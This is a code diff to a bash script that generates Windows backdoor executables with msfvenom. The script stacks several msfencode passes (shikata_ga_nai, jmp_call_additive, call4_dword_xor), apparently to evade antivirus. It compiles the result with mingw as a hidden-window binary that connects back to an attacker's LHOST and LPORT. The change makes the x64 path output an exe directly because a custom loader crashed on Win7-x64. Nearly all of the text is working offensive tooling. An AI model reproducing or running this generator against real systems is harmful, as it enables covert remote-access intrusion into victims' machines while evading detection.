@@ -93,14 +93,15 @@ if [[ $pay != *x64* ]]; then
 	msfvenom -p $pay --arch x86 --platform Windows LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null | msfencode -e x86/shikata_ga_nai -c $encit -t raw 2> /dev/null | msfencode -e x86/jmp_call_additive -c $encit -t raw 2> /dev/null | msfencode -e x86/call4_dword_xor -c $encit -t raw 2> /dev/null | msfencode -e x86/shikata_ga_nai -c $encit 2> /dev/null 1> payload.c
 	sed -e 's/\s+\|buf\s=\s//g' payload.c | sed -e '$a;' > buffer.c
 else
-	# Mingw64 check
-	if [ ! -n "$(which i686-w64-mingw32-gcc)" ]; then
-		echo -e "\e[0;31mError: Failed to find i686-w64-mingw32-gcc. Try \"apt-get install gcc-mingw32\"\e[0m"
-		exit 1
-	fi
+	# Mingw64 check (disabled)
+	#if [ ! -n "$(which i686-w64-mingw32-gcc)" ]; then
+	#	echo -e "\e[0;31mError: Failed to find i686-w64-mingw32-gcc. Try \"apt-get install gcc-mingw32\"\e[0m"
+	#	exit 1
+	#fi
 
-	msfvenom -p $pay -f c --arch x86_64 --platform Windows -e x64/xor -i $encit LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null 1> payload.c
-	sed -e 's/unsigned char buf\[\] =//g' payload.c > buffer.c
+	# Custom loader crashes every time on Win7-x64, so for now this will have to suffice
+	msfvenom -p $pay -f exe --arch x86_64 --platform Windows -e x64/xor -i $encit LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null 1> $out
+	#sed -e 's/unsigned char buf\[\] =//g' payload.c > buffer.c
 fi
 
 # Verify stage 1 succeeded
@@ -174,11 +175,11 @@ fi
 # Compilation
 echo -e "$tag Compiling...\e[0;31m"
 
-if [[ $pay != *x64* ]]; then
-	i586-mingw32msvc-gcc final.c -o $out -mwindows -s
-else
-	i686-w64-mingw32-gcc final.c -o $out -mwindows -s
-fi
+#if [[ $pay != *x64* ]]; then
+i586-mingw32msvc-gcc final.c -o $out -mwindows -s
+#else
+#i686-w64-mingw32-gcc final.c -o $out -mwindows -s
+#fi
 
 # Cleanup
 if [ "$1" != "noclean" ]; then
